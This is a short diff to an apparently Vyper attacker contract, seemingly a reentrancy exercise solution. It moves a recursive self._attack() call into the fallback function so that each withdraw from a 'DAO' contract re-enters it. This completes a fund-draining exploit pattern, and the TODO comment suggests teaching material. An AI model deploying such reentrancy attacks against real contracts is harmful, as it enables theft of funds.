@@ -21,7 +21,6 @@ def _attack() -> bool:
         return True
     
     DAO(self.dao_address).withdraw()
-    self._attack()
 
     return True
 
@@ -48,6 +47,5 @@ def attack(dao_address:address):
 @payable
 def __default__():
     # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
-    
+    self._attack()
     # TODO: Add code here to complete the recursive call
-    pass
